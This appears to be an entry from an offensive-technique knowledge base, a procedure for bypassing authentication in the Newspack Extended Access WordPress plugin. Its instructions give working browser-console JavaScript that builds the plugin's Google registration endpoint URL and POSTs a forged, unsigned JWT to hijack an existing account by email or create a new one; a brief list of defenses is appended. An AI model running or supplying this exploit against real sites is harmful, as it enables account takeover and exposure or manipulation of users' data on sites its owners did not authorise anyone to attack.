---
id: proc-003
tags:
  - auth-bypass
  - api-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/submit-jwt-via-browser-console]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:42.869Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Submit-JWT-to-Registration-Endpoint

## Summary

This procedure sends the unsigned JWT to the plugin's registration endpoint via a POST request, bypassing authentication and logging in as the specified user.

## Description

Targeting the /wp-json/newspack-extended-access/v1/google/register endpoint, this exploits the lack of signature checks to authenticate with forged tokens, leading to account hijack if the email exists or new account creation.

## Requirements

1. Target site loaded in browser
2. Generated unsigned JWT token
3. Browser console access

## Defense

Defensive measures and detection strategies:

- Validate all incoming JWT signatures server-side
- Rate-limit POST requests to auth endpoints
- Monitor for anomalous auth successes

## Objectives

1. Inject forged token to bypass auth
2. Achieve session as target user
3. Expose or manipulate account data

## Instructions

### Step 1: Prepare Endpoint URL

**Context**: Dynamically construct the API endpoint based on current site.

**Command** ([[commands/submit-jwt-via-browser-console]]):
```javascript
let url = `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;
```

> Builds the full URL, e.g., https://target.com/wp-json/newspack-extended-access/v1/google/register. Expected output: Valid URL string.

### Step 2: Execute POST Request

**Context**: Send the token as plain text body to trigger bypass.

**Command** ([[commands/submit-jwt-via-browser-console]]):
```javascript
let token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIiwiaWF0IjoxNzEzNjY2NjQ5LCJleHAiOjE3MTM2NzAyNDl9.invalid";
fetch(url, {
  cache: 'no-store',
  method: 'POST',
  headers: {'Content-type': 'text/plain'},
  body: token
}).then(response => {
  console.log(response.json(), 'response');
});
```

> Submits token; expected output: JSON success response, browser authenticates as user.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/submit-jwt-via-browser-console]]

## Tools Used


## Tags

- auth-bypass
- api-exploit
